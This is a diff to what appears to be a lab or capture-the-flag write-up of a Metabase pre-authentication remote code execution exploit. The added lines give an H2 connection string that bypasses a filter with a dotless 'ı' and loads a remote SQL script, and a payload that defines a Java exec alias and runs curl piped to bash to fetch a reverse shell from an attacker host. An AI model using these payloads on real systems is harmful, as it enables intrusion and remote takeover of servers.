@@ -62,7 +62,24 @@ The key ideas:
 - Using the diacritic character `ı` instead of `I` to bypass filter (<https://twitter.com/reginaldojsf/status/1684728514170191872>)
 - Fixing the java errors as stated in JDBC responses
 
-Final exploit script: [metabase_preauth_rce.py](metabase_preauth_rce.py)
+The H2 database query:
+
+```text
+mem:;ıNIT=RUNSCRIPT FROM 'http://10.10.14.80:8000/poc.sql'//\;
+```
+
+Queries in `poc.sql`:
+
+```text
+"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{Runtime.getRuntime().exec(cmd);return \"a\";}}';CALL EXEC ('bash -c {{curl,{lhost}:{lport}/payload}}|{{bash,-i}}')"
+```
+
+`payload` is a bash reverse shell one-liner.
+
+**Note**: Above queries have extraneous `\` or `{{` for escaping quotes in JSON or other characters within Python f-strings.  
+As a result, the provided payloads would not work when used with `curl` or `BurpSuite` without adjustments.
+
+Full exploit script: [metabase_preauth_rce.py](metabase_preauth_rce.py)
 
 ```console
 inte@debian-pc:~$ python3 metabase_preauth_rce.py
